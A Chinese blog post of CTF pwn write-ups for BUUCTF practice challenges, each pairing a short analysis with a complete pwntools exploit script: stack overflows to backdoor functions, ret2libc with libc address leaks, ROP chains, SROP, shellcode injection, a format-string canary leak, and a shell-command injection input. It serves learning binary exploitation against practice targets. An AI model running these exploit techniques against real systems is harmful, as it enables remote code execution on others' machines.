---
title: "CTF-pwn 杂题乱写 0x00 版"
description: "如有错误请指出"
date: 2026-02-16T00:00:00+08:00
image: ctf_q1.jpg
math: true
license: 
hidden: false
comments: true
draft: false
categories:
    - ctf
tags:
    - ctf
    
---

BUU CTF 登录之后，题目链接是对的，没有登录就直接跳转搜索了好像。

只有杂鱼才会乱写杂题。

## 浅水区

可能是窝一辈子都不能企及的高度了。

### ciscn_2019_n_1

[题目链接](https://buuoj.cn/challenges#ciscn_2019_n_1)

IDA 容易发现某变量等于 11.28125 （即 0x41348000）时就会直接 ak，虽然那个变量不可直接修改，但是我们可以栈溢出啊。

<img width="347" height="195" alt="image" src="https://github.com/user-attachments/assets/47a9e491-52b2-4dcf-8682-b0a35e402ed6" />

v1 到 rbp 是 0x30，v2 到 rbp 是 0x4，那么 v1 到 v2 是小学加减法。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 25635
io = remote(host,port)
offset = 0x30 - 0x4
payload = b'A'*offset + p64(0x41348000)     # 11.28125 → 0x41348000

def main():
    io.recvuntil(b"Let's guess the number.\n")
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

### pwn1_sctf_2016

[题目链接](https://buuoj.cn/challenges#pwn1_sctf_2016)

容易发现有一个后门函数 `getflag`。

然而再考虑栈溢出的时候发现 `fgets` 只留了 32 的长度读入。

<img width="810" height="509" alt="image" src="https://github.com/user-attachments/assets/05f07cec-cb37-4439-b212-44c41b09695d" />

然而仔细一看后面看似没什么用的代码，竟然把输入的 I 变成了 you，变量到 ebp 有 60 字节可以用 20 个 I 代替。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 28374
io = remote(host,port)
get_flag = 0x8048f0d

payload = b'I'*20 + b'A'*4 + p32(get_flag)

def main():
    # io.recvuntil(b"Tell me something about yourself: ")
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

### jarvisoj_level2

[题目链接](https://buuoj.cn/challenges#jarvisoj_level2)

IDA 轻易发现了 `system`，仔细一看。

<img width="763" height="322" alt="d3d78920d973a73295c7873ed6daf03f" src="https://github.com/user-attachments/assets/31f9d56f-6623-4962-b30a-efe42874079e" />

hint 里面竟然是 binsh。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 28040
io = remote(host,port)
offset = 0x88 + 0x4
binsh = 0x804a024
system = 0x804849e
payload = b'A'*offset  + p32(system) + p32(binsh)

def main():
    io.recvuntil(b"Input:\n")
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()

```

### jarvisoj_level2_x64

[题目链接](https://buuoj.cn/challenges#jarvisoj_level2_x64)

换了 64 位，注意寄存器，没啥区别。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 29541
io = remote(host,port)
system = 0x40063e
binsh = 0x600a90
pop_rdi_ret = 0x4006b3
offset = 0x88
payload = b'A'*offset + p64(pop_rdi_ret) + p64(binsh) + p64(system)

def main():
    io.recvuntil(b"Input:\n")
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

### ciscn_2019_n_8

[题目链接](https://buuoj.cn/challenges#ciscn_2019_n_8)

一看保护开的挺全，吓哭了，看看 IDA。

<img width="981" height="493" alt="image" src="https://github.com/user-attachments/assets/e4c43cfd-7055-4d34-adea-455d52fa0d9c" />

竟然是猜猜偏移，😀，笑嘻了，直接爆破了。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 28863
io = remote(host,port)
# payload = p32(1) + p32(2) + p32(3) + p32(4) + p32(5) + p32(6) + p32(7) + p32(8) + p32(1) + p32(2) + p32(3) + p32(4) + p32(5) + p32(6) + p32(7) + p32(8)
offset = 0x34

payload = b'A'*offset + p32(17)

def main():
    io.recvuntil("What's your name?\n")
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

### bjdctf_2020_babystack

[题目链接](https://buuoj.cn/challenges#bjdctf_2020_babystack)

看看 IDA 发现 backdoor，板子栈溢出。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 29142
io = remote(host,port)
offset = 0x18
backdoor = 0x4006e6
payload = b'A'*offset + p64(backdoor)

def main():
    io.recvuntil(b"[+]Please input the length of your name:\n")
    io.sendline(b"200")
    io.recvuntil(b"[+]What's u name?\n")
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()

```

### bjdctf_2020_babystack2

[题目链接](https://buuoj.cn/challenges#bjdctf_2020_babystack2)

<img width="1191" height="499" alt="image" src="https://github.com/user-attachments/assets/c2b811c9-da02-44e0-b504-620a7fd70cf4" />

输入的第一个数不能超过 10，但是它会成为我们第二次输入的长度限制，好麻烦啊。。。

🤔怎么有 `unsigned int` 强制转换，闹麻了😓

第一次输入 `-1` 直接绕过了。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 26734
io = remote(host,port)
# io = process('./bjdctf_2020_babystack2')
back_door = 0x400726    # backdoor	0000000000400726	
offset = 0x18
payload = b'A'*offset + p64(back_door)

def main():
    io.recvuntil(b"[+]Please input the length of your name:\n")
    io.sendline(b'-1')
    io.recvuntil(b"[+]What's u name?\n")
    io.sendline(payload)
    io.interactive()
    

if __name__ == "__main__":
    main()
```

### get_started_3dsctf_2016

[题目链接](https://buuoj.cn/challenges#get_started_3dsctf_2016)

什么叫 IDA 里塞这么多东西😰😰😰

哦，又有后门函数。

<img width="1156" height="536" alt="image" src="https://github.com/user-attachments/assets/08662957-5dcd-4c08-ab8f-6b28f8b4aff2" />

哦，两个参数必须一样才执行，32 位传参直接跟在后面就行。

返回地址填一个 exit。

什么叫偏移值不对😰😰😰。

哦没有旧的 rbp，少四个字节。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 26192
io = remote(host,port)
offset = 0x38   # 没有 pop ebp，不需要加 4 字节覆盖旧栈底
get_flag = 0x80489a0
exit = 0x804e6a0    # 强迫系统刷新缓冲区，把 flag 吐出来
x1 = 814536271
x2 = 425138641
payload = b'A'*offset + p32(get_flag) + p32(exit) + p32(x1) + p32(x2)


def main():
    # io.recvuntil(b"Qual a palavrinha magica?")
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

### not_the_same_3dsctf_2016

[题目链接](https://buuoj.cn/challenges#not_the_same_3dsctf_2016)

依旧打开 IDA 一大坨。

依旧后门函数。

<img width="1109" height="490" alt="image" src="https://github.com/user-attachments/assets/d6795ce6-2663-48ec-8dc4-be2bf5f454e1" />

大概就是读取 flag.txt 的内容并且存在内存里，点击看看 fl4g 在哪。

<img width="711" height="150" alt="image" src="https://github.com/user-attachments/assets/daeedcae-6219-4778-ad2b-58e4365db4fd" />

这是好的，那么我们在找一个 printf 和 一个 exit 就好了。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 27933
io = remote(host,port)
# io = process("./not_the_same_3dsctf_2016")
offset = 0x2d
getsecret = 0x80489a0
flag = 0x80eca2d
printf = 0x804f0a0
exit = 0x804e660
payload = b'A'*offset + p32(getsecret) + p32(printf) + p32(exit) + p32(flag)

def main():
    # io.recvuntil(b"b0r4 v3r s3 7u 4h o b1ch4o m3m0...")
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

### jarvisoj_tell_me_something

[题目链接](https://buuoj.cn/challenges#jarvisoj_tell_me_something)

<img width="1180" height="545" alt="image" src="https://github.com/user-attachments/assets/a5762301-a7a5-41ed-9a30-0aa8f19994c5" />

打开 ida 不幸地发现栈溢出就要 `0x88`（没有 `ret`，cyclic 可查），输入长度卡死 `0x100`，那么显然是不可以 ret2libc 的。

更难的我不会，先找找后门函数先。

<img width="1153" height="503" alt="image" src="https://github.com/user-attachments/assets/212603af-7f6e-4a40-84f1-50999e5b40c4" />

可爱的后门函数藏得深了一点点，直接得到 flag。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 29933
io = remote(host,port)
# io = process('./guestbook')
offset = 136
good_game = 0x400620    # good_game	0000000000400620	
payload = b'A'*offset + p64(good_game)


def main():
    io.recvuntil(b"Input your message:\n")
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

### picoctf_2018_rop chain

[题目链接](https://buuoj.cn/challenges#picoctf_2018_rop%20chain)

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 25154
io = remote(host,port)
offset = 0x1C
main = 0x804873B
flag = 0x804862B
win_func1 = 0x80485CB
win_func2 = 0x80485D8
win2_a1 = 0xBAAAAAAD     # -1163220307
flag_a1= 0xDEADBAAD     # -559039827
payload_1 = b'A'*offset + p32(win_func1) + p32(main)
payload_2 = b'A'*offset + p32(win_func2) + p32(main) + p32(win2_a1)
payload_3 = b'A'*offset + p32(flag) + p32(0) + p32(flag_a1)

def main():
    io.recvuntil(b"Enter your input> ")
    io.sendline(payload_1)
    io.recvuntil(b"Enter your input> ")
    io.sendline(payload_2)
    io.recvuntil(b"Enter your input> ")
    io.sendline(payload_3)
    io.interactive()

if __name__ == "__main__":
    main()
```

### bjdctf_2020_router

[题目链接](https://buuoj.cn/challenges#bjdctf_2020_router)

一看主函数这么长，细看闹麻了🤣🤣🤣

<img width="1992" height="698" alt="image" src="https://github.com/user-attachments/assets/7e194572-9143-4628-80df-6c8ed6c5d71d" />

只有 case1 有意义，把输入内容拼接到 dest 后面然后执行 system，但是 dest 是 ping（ASCII 码），没啥影响，后面写上 &&\bin\sh 就行。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 28878
io = remote(host,port)
# io = process("./bjdctf_2020_router")

def main():
    io.recvuntil(b"Please input u choose:\n")
    io.sendline(b"1")
    io.recvuntil(b"Please input the ip address:\n")
    io.sendline(b"&&/bin/sh")
    io.interactive()

if __name__ == "__main__":
    main()
```

### jarvisoj_test_your_memory

[题目链接](https://buuoj.cn/challenges#jarvisoj_test_your_memory)

挺神秘一道题，我一开始还打算把 s2 拼接到 payload 上，但是突然发现这个题目，它的那个靶机没关缓冲区，导致 I/O 缓冲死锁，即远程程序执行了 puts 等打印操作，但文字卡在全缓冲区里没有发出来，靶机一开始就“卡”住等待输入。

所以我们得不到 s2，必须发送 payload 直接成功。

那么直接查 system 和 binsh 吧。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 26198
io = remote(host, port)
# io = process("./memory")
elf = ELF("./memory")
cat_flag = next(elf.search(b"cat flag"))
system = elf.sym['system']
main_addr = elf.sym['main']

def main():
    print("[+] Found 'cat flag' at:",hex(cat_flag))    
    payload = b'A'*0x17 + p32(system) + p32(main_addr) + p32(cat_flag)
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

### picoctf_2018_buffer overflow 1

[题目链接](https://buuoj.cn/challenges#picoctf_2018_buffer%20overflow%201)

依旧水，栈溢出，懒得写题解。

```
## written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 27607
io = remote(host,port)
# io = process("./Picoctf_2018_buffer_overflow_1")
elf = ELF("./Picoctf_2018_buffer_overflow_1")
win = 0x80485CB
main_addr = elf.sym['main']

def main():
    io.recvuntil(b"Please enter your string: \n")
    payload = b'A'*0x2C + p32(win) + p32(main_addr)
    # gdb.attach(io,"b *0x804865A\nc")
    # pause()
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

### picoctf_2018_buffer overflow 2

[题目链接](https://buuoj.cn/challenges#picoctf_2018_buffer%20overflow%202)

水栈溢出。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 28462
io = remote(host,port)
# io = process("./PicoCTF_2018_buffer_overflow_2")
win = 0x80485CB	
elf = ELF("./PicoCTF_2018_buffer_overflow_2")


def main():
    io.recvuntil(b"Please enter your string: \n")
    payload = b'A'*0x70 + p32(win) + p32(0) + p32(0xDEADBEEF) + p32(0xDEADC0DE)
    io.sendline(payload)
    io.interactive()
    
if __name__ == "__main__":
    main()
```

### wustctf2020_closed

[题目链接](https://buuoj.cn/challenges#wustctf2020_closed)

没见过的题目，做一下。

<img width="2355" height="956" alt="image" src="https://github.com/user-attachments/assets/9e3d00ae-b9be-4ab9-97e3-dde6b0574d1e" />

close(1) 关闭输出流，close(2) 关闭错误流，但是没有关闭输入流（0），所以我们对 shell 发送的东西都可以被收到，包括 cat flag，但是它不能输出。

所以我们 `exec 1>&0` **“将文件描述符 1 复制/重定向到文件描述符 0 所指向的位置”。**

也就是把输出流绑到输入流上。

```
from pwn import *

p = remote('node5.buuoj.cn', 27871) 

p.recvuntil(b"What else can you do???\n")

p.sendline(b"exec 1>&0")

p.sendline(b"cat flag")

p.interactive()
```

## 中水区

可能只有主播这种区才会觉得这里是中水区。

### ciscn_2019_en_2

[题目链接](https://buuoj.cn/challenges#ciscn_2019_en_2)

开了 NX 保护。

<img width="876" height="509" alt="image" src="https://github.com/user-attachments/assets/c21b351e-c933-46c0-976a-8218ba01e0c3" />

主函数告诉你只有操作 1 有意义。

<img width="1017" height="512" alt="image" src="https://github.com/user-attachments/assets/6c4e23ad-3968-4414-8db1-b8321c094a98" />

加密函数告诉你他会对你异或加密，但是 `strlen()` 遇到 `\0` 就截停，可以通过此方法跳过加密。

跳过加密之后就可以泄露 puts 了，ret2libc。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 28676
io = remote(host,port)
# io = process("./ciscn_2019_en_2")
elf = ELF('./ciscn_2019_en_2')
offset = 0x57
pop_rdi_ret = 0x400c83
ret = 0x400c84
pop_rsi_r15_ret = 0x400c81
encrypt_addr = 0x4009a0
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
payload_1 = b'\0' + b'A'*offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)

def main():
    io.recvuntil(b"Input your choice!\n")
    io.sendline(b"1")
    io.recvuntil(b"Input your Plaintext to be encrypted\n")
    io.sendline(payload_1)
    puts_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
    print(hex(puts_addr))   # 0x7f2a1ef599c0
    system_addr = puts_addr - 0x31580
    binsh_addr = puts_addr + 0x1334da
    payload_2 = b'\0' + b'A'*offset + p64(pop_rdi_ret) + p64(binsh_addr) + p64(ret) + p64(system_addr)
    io.recvuntil(b"Input your Plaintext to be encrypted\n")
    io.sendline(payload_2)
    io.interactive()

if __name__ == "__main__":
    main()
```

### ciscn_2019_ne_5

[题目链接](https://buuoj.cn/challenges#ciscn_2019_ne_5)

IDA 打开一看，main 函数一大串，前面有个密码，就是 `administrator`，无意义。

后面四个操作。

操作 1：

<img width="808" height="515" alt="image" src="https://github.com/user-attachments/assets/84d3fd8c-b2d2-4315-99ec-d79902814c0b" />

给 src 赋值，**最长读入长度 128**。

操作 2：

<img width="937" height="425" alt="image" src="https://github.com/user-attachments/assets/ee01314b-44c7-4d7d-a8b1-303bf3f327be" />

输出 src，逗逗你呀。

操作 3：

<img width="997" height="446" alt="image" src="https://github.com/user-attachments/assets/e85a446b-29fc-4d12-a931-e1d85443fbc5" />

有 `system`，OMO。

操作 4：

<img width="1005" height="554" alt="image" src="https://github.com/user-attachments/assets/c00d6a2c-602f-4e65-acec-798b0e5dd88d" />

把 src 粘贴到 dest 上，然后输出 dest，发现 dest 到栈底距离 0x48 = 72，小于128，可以栈溢出。

现在就是去找 `/bin/sh`，ROPgadget 找一下。

<img width="343" height="74" alt="image" src="https://github.com/user-attachments/assets/a863de58-e5f3-46b7-80d6-a356437c77c2" />

其实去 IDA 查一下，发现是 `fflush`，但是能用。

<img width="1020" height="466" alt="image" src="https://github.com/user-attachments/assets/61ee2bf7-ff27-4099-a88c-2cb6fc19d378" />

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 25971
io = remote(host,port)
# io = process('./ciscn_2019_ne_5')
offset = 0x4c
system = 0x80484d0
sh = 0x80482ea
main = 0x8048722
payload = b'A'*offset + p32(system) + p32(main) + p32(sh)

def main():
    io.recvuntil(b"Please input admin password:")
    io.sendline(b"administrator")
    io.recvuntil(b"0.Exit\n:")
    io.sendline(b"1")
    io.recvuntil(b"Please input new log info:")
    io.sendline(payload)
    io.recvuntil(b"0.Exit\n:")
    io.sendline(b"4")
    io.interactive()

if __name__ == "__main__":
    main()
```

### 铁人三项(第五赛区)_2018_rop

[题目链接](https://buuoj.cn/challenges#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9(%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA)_2018_rop)

一眼丁真，鉴定为春春的 ret2libc 😋

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 29549
io = remote(host,port)
# io = process('./2018_rop')
elf = ELF('./2018_rop')
offset = 140
vuln_addr = 0x8048474
write_got = elf.got['write']
write_plt = elf.plt['write']
payload_1 = b'A'*offset + p32(write_plt) + p32(vuln_addr) + p32(1) + p32(write_got) + p32(4)


def main():
    io.sendline(payload_1)
    leak_data = io.recvn(4)
    write_addr = u32(leak_data)
    print(hex(write_addr))  # 0xf7e936f0
    libc = write_addr - 0xe56f0
    system = libc + 0x3cd10
    binsh = libc + 0x17b8cf
    payload_2 = b'A'*offset + p32(system) + p32(114514) + p32(binsh)
    io.sendline(payload_2)
    io.interactive()

if __name__ == "__main__":
    main()
```

### bjdctf_2020_babyrop

[题目链接](https://buuoj.cn/challenges#bjdctf_2020_babyrop)

依旧普普通通 ret2libc。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 28493
io = remote(host,port)
# io = process('./bjdctf_2020_babyrop')
elf = ELF('./bjdctf_2020_babyrop')
offset = 0x28
vuln_addr = 0x40067d
pop_rdi_ret = 0x400733
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
payload_1 = b'A'*offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)

def main():
    io.recvuntil("Pull up your sword and tell me u story!\n")
    io.sendline(payload_1)
    puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
    # puts_addr = u64(leak_data)
    # # leak_data = io.recvn(8)
    print(hex(puts_addr))   # 0x7fd070fdf690 → libc6_2.23-0ubuntu11_amd64
    libc = puts_addr - 0x6f690
    system = libc + 0x45390
    binsh = libc + 0x18cd57
    payload_2 = b'A'*offset + p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(114514)
    io.sendline(payload_2)
    io.interactive()
    

if __name__ == "__main__":
    main()
```

### ciscn_2019_es_7

[题目链接](https://buuoj.cn/challenges#ciscn_2019_es_7)

这题长的和 ciscn_2019_s_3 一模一样啊，显然的 SROP。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 29961
io = remote(host,port)
# io = process("./ciscn_2019_es_7")
elf = ELF("./ciscn_2019_es_7")
bss_addr = elf.bss() + 0x500
# pop_rax_execve = 0x4004E2
pop_rax_sigreturn = 0x4004DA
syscall = 0x400517

def main():
    frame1 = SigreturnFrame()
    frame1.rax = constants.SYS_read
    frame1.rdi = 0  # stdin
    frame1.rsi = bss_addr
    frame1.rdx = 0x400
    frame1.rsp = bss_addr 
    frame1.rip = syscall
    payload_1 = b'A'*0x10 + p64(pop_rax_sigreturn) + p64(syscall) + bytes(frame1)
    io.send(payload_1)
    io.recv(0x30)
    sleep(0.1)
    binsh = bss_addr + 0x108
    frame2 = SigreturnFrame()
    frame2.rax = constants.SYS_execve
    frame2.rdi = binsh
    frame2.rsi = 0
    frame2.rdx = 0
    frame2.rip = syscall
    payload_2 = p64(pop_rax_sigreturn) + p64(syscall) + bytes(frame2)
    payload_2 = payload_2.ljust(0x108,b'\x00')
    payload_2 = payload_2 + b"/bin/sh\x00"
    io.send(payload_2)
    io.interactive()

if __name__ == "__main__":
    main()
```

### pwn2_sctf_2016

[题目链接](https://buuoj.cn/challenges#pwn2_sctf_2016)

我去做了这个题我才知道 buuctf 允许直接下载它的 libc 文件，那我之前在寻找什么，棍木吗。

ret2libc 无需多言。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 27070
io = remote(host,port)
# io = process('./pwn2_sctf_2016')
elf = ELF('./pwn2_sctf_2016')
libc = ELF('./libc-2.23.so')
offset = 0x30
vuln = 0x804852F
printf_got = elf.got['printf']
printf_plt = elf.plt['printf']
fmt = next(elf.search(b"%s"))
payload_1 = b'A'*offset + p32(printf_plt) + p32(vuln) + p32(fmt) + p32(printf_got)

def main():
    io.recvuntil(b"How many bytes do you want me to read? ")
    io.sendline(b"-1")
    io.recvuntil(b"bytes of data!\n")
    io.sendline(payload_1)
    io.recvuntil(b"\n")
    leak_data = io.recv(4)
    printf_addr = u32(leak_data)
    print(hex(printf_addr))         # 0xf7e02020
    libc_base = printf_addr - libc.sym['printf']
    system = libc_base + libc.sym['system']
    binsh = libc_base + next(libc.search(b'/bin/sh'))
    payload_2 = b'A'*offset + p32(system) + p32(vuln) + p32(binsh)
    io.recvuntil(b"How many bytes do you want me to read? ")
    io.sendline(b"-1")
    io.recvuntil(b"bytes of data!\n")
    io.sendline(payload_2)
    io.interactive()

if __name__ == "__main__":
    main()


```

### ez_pz_hackover_2016

[题目链接](https://buuoj.cn/challenges#ez_pz_hackover_2016)

这道题没看 NX 保护，思路挺简单，就是 shellcode 注入，但是还是挺考验动态调试的。

chall 函数：

<img width="2546" height="911" alt="image" src="https://github.com/user-attachments/assets/a679f41b-30f3-40ed-aa71-1caa80ed64a5" />

大概意思是先给你 s 的地址，然后让你输入一个字符串，并把这个字符串结尾的换行去掉，如果这个字符串是 crashme，就进入 vuln。

我们也不用搞什么换行换 \0 的操作，直接上 \0 截断就行。

然后就是动态调试找偏移：

<img width="1541" height="1173" alt="e0db18b9248dce042e69e0e58e3cfc8f" src="https://github.com/user-attachments/assets/e91bb5ff-fa9a-49c9-abde-156a9c05b94c" />

（发送了“crashme\x00meowmeow"）

可以看到，从 `ret addr = 0xfffb687c` 到 meow 的第一个 m 的位置 `0xfffb686A` 的偏移是 0x12。

（m 的 ascii 码是 0x6d，在 0x656d0065 刚好排第 3 位，前面是 \x00）

<img width="1394" height="802" alt="c21549bb4c5937ca2b0e18c62271c03b" src="https://github.com/user-attachments/assets/e2f716fc-0098-4d43-b185-77c28df96d9d" />

（发送了“crashme\x00AAAAAAAAAAAAAAAAAAAAAAAAAA”）

发现 `ret_addr = 0xffda3b20` 到溢出的 s 的地址 `leak_stack = 0xffda3b3c` 的偏移是 0x1c。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 27275
io = remote(host,port)
# io = process("./ez_pz_hackover_2016")
elf = ELF("./ez_pz_hackover_2016")
libc = ELF("./libc-2.23.so")
main_addr = elf.sym['main']
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']

def main():
    # gdb.attach(io,"b *0x8048600")
    io.recvuntil(b"Yippie, lets crash: ")
    leak_addr = io.recvline().strip(b'\n')
    leak_stack = int(leak_addr,16)
    print("\n[+]Leak stack:",hex(leak_stack))
    io.recvuntil(b"Whats your name?\n")
    io.recvuntil(b"> ")
    ret_addr = leak_stack - 0x1c
    offset = 0x7c - 0x6A
    shellcode = asm(shellcraft.sh())
    payload = b"crashme\x00" + b'A'*offset + p32(ret_addr) + shellcode
    io.sendline(payload)
    # pause()
    io.interactive()

if __name__ == "__main__":
    main()
```

### bjdctf_2020_babyrop2

[题目链接](https://buuoj.cn/challenges#bjdctf_2020_babyrop2)

开了 canary 保护，但是 fmt 漏洞。

<img width="2556" height="918" alt="image" src="https://github.com/user-attachments/assets/b8aec103-b451-457b-b178-a00dfdb64bac" />

简单扫一下，发现偏移是 6，然后第 7 个有点像 canary，gdb 一下发现就是。

<img width="1899" height="1049" alt="f0c1d1c8bbbae9e679e199c2afd1d17b" src="https://github.com/user-attachments/assets/c7b3232a-8f05-47f1-9688-97cc81964716" />

然后直接 ret2libc。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 27342
io = remote(host,port)
# io = process("./bjdctf_2020_babyrop2")
elf = ELF("./bjdctf_2020_babyrop2")
libc = ELF("./libc-2.23.so")
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.sym['main']
pop_rdi_ret = 0x400993
ret = 0x400994

def main():
    io.recvuntil(b"I'll give u some gift to help u!\n")
    payload_1 = b"AA%7$p"   # 7 11
    io.send(payload_1)
    io.recvuntil(b"AA")
    leak_data = io.recvline().strip(b'\n')
    leak_canary = int(leak_data,16)
    print("\n[+] Leak Canary:",hex(leak_canary))
    io.recvuntil(b"Pull up your sword and tell me u story!\n")
    payload_2 = b'A'*0x18 + p64(leak_canary) + b"B"*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
    # payload_2 = b'A'*8 + b'B'*8 + b'C'*8
    # gdb.attach(io,"b *0x4008D8\n c")
    # pause()
    io.send(payload_2)
    leak_data = io.recvline().strip(b'\n')
    leak_data = leak_data.ljust(8,b'\x00')
    puts_addr = u64(leak_data)
    print("\n[+] Leak puts:",hex(puts_addr))
    libc_base = puts_addr - libc.sym['puts']
    system = libc_base + libc.sym['system']
    binsh = libc_base + next(libc.search(b'/bin/sh'))
    print("\n[+] Leak libc base:",hex(libc_base))
    print("\n[+] Leak system:",hex(system))
    print("\n[+] Leak binsh:",hex(binsh))
    io.recvuntil(b"I'll give u some gift to help u!\n")
    io.send(payload_1)
    io.recvuntil(b"Pull up your sword and tell me u story!\n")
    payload_3 = b'A'*0x18 + p64(leak_canary) + b"B"*8 + p64(ret) +  p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(0)
    io.sendline(payload_3)
    io.interactive()

if __name__ == "__main__":
    main()
```

### jarvisoj_level4

[题目链接](https://buuoj.cn/challenges#jarvisoj_level4)

这个题何意味啊，之前做个 level3，输入长度限制是 0x200，这个是 0x100，我还以为要栈迁移呢，找了找发现 bss 段小的可怜，仔细数了一下溢出，刚刚好能走 ret2libc，和 level3 一模一样，平凡。

呃呃。

```
# written by Sonnety
from pwn import *
from LibcSearcher import *

context(os = "linux",arch = "i386",log_level = "debug")

host = "node5.buuoj.cn"
port = 28791

io = remote(host,port)
# io = process("./level4")
elf = ELF("./level4")
libc = ELF("./libc-2.23.so")
offset = 0x8c
main_addr = elf.sym['main']    # main	08048484	
write_got = elf.got['write']
write_plt = elf.plt['write']

def main():
    payload_1 = b'A'*offset + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
    io.sendline(payload_1)
    leak_data = io.recvn(4) 
    write_addr = u32(leak_data)
    print("\n[+] Leak write address:",hex(write_addr))
    libc_base = write_addr - libc.sym['write']
    system = libc_base + libc.sym['system']
    binsh = libc_base + next(libc.search(b"/bin/sh"))
    print("\n[+] Leak libc base address:",hex(libc_base))
    print("\n[+] Leak system address:",hex(system))
    print("\n[+] Leak binsh address:",hex(binsh))
    payload_2 = b'A'*offset + p32(system) + p32(main_addr) + p32(binsh)
    io.sendline(payload_2)
    io.interactive()

if __name__ == "__main__":
    main()

```
